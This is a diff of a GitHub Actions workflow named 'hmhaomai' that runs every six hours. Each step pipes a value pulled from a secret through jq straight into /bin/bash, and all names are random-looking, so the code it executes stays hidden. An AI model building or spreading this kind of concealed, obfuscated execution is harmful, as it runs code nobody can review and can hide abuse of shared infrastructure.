@@ -1,28 +1,25 @@
 name: hmhaomai
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
-
+    - cron: '6 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hmhaomai
         env:
-          yce87400: ${{ secrets.yce87400 }}
+          p813: ${{ secrets.p813 }}
         run: |
-          echo $yce87400 | jq -r .ktpi480 | /bin/bash
-          echo $wlrwm3681 | jq -r .jlkm783 | /bin/bash
-          echo $nbbz82 | jq -r .i0 | /bin/bash
-          echo $wkw98 | jq -r .p0 | /bin/bash
-          echo $lz9352 | jq -r .qrbh7 | /bin/bash
-          echo $kv7458 | jq -r .s2 | /bin/bash
-          echo $udbn56 | jq -r .d144 | /bin/bash
-          echo $zn530 | jq -r .j4957 | /bin/bash
-          echo $diq0513 | jq -r .w581 | /bin/bash
-          echo $bd5 | jq -r .q743 | /bin/bash
-          echo $en5950 | jq -r .nzri27 | /bin/bash
+          echo $p813 | jq -r .w3603 | /bin/bash
+          echo $qeifp1 | jq -r .q81 | /bin/bash
+          echo $qekri787 | jq -r .xrwts23 | /bin/bash
+          echo $o8368 | jq -r .pgi2 | /bin/bash
+          echo $ipigv58 | jq -r .z18 | /bin/bash
+          echo $wuos384 | jq -r .vz5 | /bin/bash
+          echo $fyics3 | jq -r .ciaob66775 | /bin/bash
+          echo $exdgg0509 | jq -r .b764 | /bin/bash
+          echo $py00988 | jq -r .kjet7 | /bin/bash
 
